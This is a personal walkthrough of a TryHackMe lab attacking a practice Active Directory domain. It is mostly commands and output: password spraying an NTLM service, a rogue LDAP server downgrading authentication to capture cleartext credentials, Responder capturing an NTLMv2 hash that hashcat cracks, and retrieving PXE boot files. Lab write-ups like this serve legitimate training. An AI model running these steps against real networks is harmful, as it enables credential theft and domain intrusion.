# https://tryhackme.com/room/breachingad

```bash
=================================
10.200.70.101 -- thmdc.za.tryhackme.com -- win x32/x64
=================================

# Enable dnsmasq plugin & DNS config
sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.bak
sudo sed -i '/\[main\]/a dns=dnsmasq' /etc/NetworkManager/NetworkManager.conf
echo "server=/za.tryhackme.com/10.200.70.101" | sudo tee /etc/NetworkManager/dnsmasq.d/breachad.conf

vpn-connect

# Configures to use dnsmasq
sudo nmcli connection modify "breachad" ipv4.dns ""
sudo nmcli connection modify "breachad" ipv4.ignore-auto-dns yes
sudo nmcli connection modify "breachad" ipv4.never-default yes

# Verify settings (might need to disconnect/reconnect VPN)
ping -c 1 google.com
nslookup thmdc.za.tryhackme.com

---

### NetNTLM
# Services forward requests/credentials to DC to authorize access

unzip passwordsprayer-1647011410194.zip
python3 -m venv venv
source venv/bin/activate
pip3 install requests requests_ntlm

# Intel tells us default password: Changeme123
# http://ntlmauth.za.tryhackme.com
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
// [+] Valid credential pair found! Username: hollie.powell Password: Changeme123
// [+] Valid credential pair found! Username: heather.smith Password: Changeme123
// [+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
// [+] Valid credential pair found! Username: georgina.edwards Password: Changeme123

### LDAP
# Service has AD creds that it can LDAP to search the user creds against the AD; directly auths

# https://printer.za.tryhackme.com/settings.aspx

sudo nc -lvp 389
ip a s breachad
# set server to: 10.150.70.8 > Test Settings
// 0Dc;
// x
//  objectclass0supportedCapabilities
// !!! trying to negotiate auth protocol !!!

sudo apt update -y && sudo apt -y install slapd ldap-utils && sudo systemctl enable --now slapd
sudo dpkg-reconfigure -p low slapd
# No
# Org Name: za.tryhackme.com
# Enter password
# Purged: No
# Move: Yes

# Now Create downgrade auth settings:
echo '#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred' | tee olcSaslSecProps.ldif
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

# Confirm
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
// supportedSASLMechanisms: LOGIN
// supportedSASLMechanisms: PLAIN
// !!! SUCCESS !!!

# Capture creds via Test Settings again:
sudo tcpdump -SX -i breachad tcp port 389
// ...
//         0x0030:  0660 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
//         0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
//         0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
//         0x0060:  6461 7070 6173 7331 40                   dappass1@
// ...
// za.tryhackme.com\svcLDAP..tryhackmeldappass1@

### AUTH RELAY

sudo responder -I breachad
// 0935: wait for LLMNR, NBT-NS, or WPAD requests

// [SMB] NTLMv2-SSP Client   : 10.200.70.202
// [SMB] NTLMv2-SSP Username : ZA\svcFileCopy
// [SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:79efd9d219489bac:9BDA24BC91E6EBE9DCAAED4BCF056DB2:010100000000000080114C79DC61DC0152A6BD123C6709E000000000020008004500430053004B0001001E00570049004E002D004C0045004C00570043004900300058004E0052005A0004003400570049004E002D004C0045004C00570043004900300058004E0052005A002E004500430053004B002E004C004F00430041004C00030014004500430053004B002E004C004F00430041004C00050014004500430053004B002E004C004F00430041004C000700080080114C79DC61DC01060004000200000008003000300000000000000000000000002000003F7924BB3D04E3FF2B2CA4604C488794FCAB3E6B95DC8031403F5648D3ABBCA60A001000000000000000000000000000000000000900200063006900660073002F00310030002E003100350030002E00370030002E0038000000000000000000

echo 'svcFileCopy::ZA:79efd9d219489bac:9BDA24BC91E6EBE9DCAAED4BCF056DB2:010100000000000080114C79DC61DC0152A6BD123C6709E000000000020008004500430053004B0001001E00570049004E002D004C0045004C00570043004900300058004E0052005A0004003400570049004E002D004C0045004C00570043004900300058004E0052005A002E004500430053004B002E004C004F00430041004C00030014004500430053004B002E004C004F00430041004C00050014004500430053004B002E004C004F00430041004C000700080080114C79DC61DC01060004000200000008003000300000000000000000000000002000003F7924BB3D04E3FF2B2CA4604C488794FCAB3E6B95DC8031403F5648D3ABBCA60A001000000000000000000000000000000000000900200063006900660073002F00310030002E003100350030002E00370030002E0038000000000000000000' | tee hashes.txt

# Crack hashes
# https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 5600 hashes.txt passwordlist-1647876320267.txt
// SVCFILECOPY::ZA:79efd9d219489bac:9bda24bc91e6ebe9dcaaed4bcf056db2:010100000000000080114c79dc61dc0152a6bd123c6709e000000000020008004500430053004b0001001e00570049004e002d004c0045004c00570043004900300058004e0052005a0004003400570049004e002d004c0045004c00570043004900300058004e0052005a002e004500430053004b002e004c004f00430041004c00030014004500430053004b002e004c004f00430041004c00050014004500430053004b002e004c004f00430041004c000700080080114c79dc61dc01060004000200000008003000300000000000000000000000002000003f7924bb3d04e3ff2b2ca4604c488794fcab3e6b95dc8031403f5648d3abbca60a001000000000000000000000000000000000000900200063006900660073002f00310030002e003100350030002e00370030002e0038000000000000000000:FPassword1!

### PXE Recovery

# http://pxeboot.za.tryhackme.com
// x64{2D31C605-EA1A-4D94-820F-2E08BE940FBD}.bcd

sshpass -p 'Password1@' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 thm@THMJMP1.za.tryhackme.com

cd Documents
mkdir tacoman
copy C:\powerpxe tacoman\
cd tacoman

tftp -i 10.200.70.202 GET "\Tmp\x64{2D31C605-EA1A-4D94-820F-2E08BE940FBD}.bcd" conf.bcd

# https://github.com/wavestone-cdt/powerpxe
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
// >> Parse the BCD file: conf.bcd
// >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
// \Boot\x64\Images\LiteTouchPE_x64.wim
```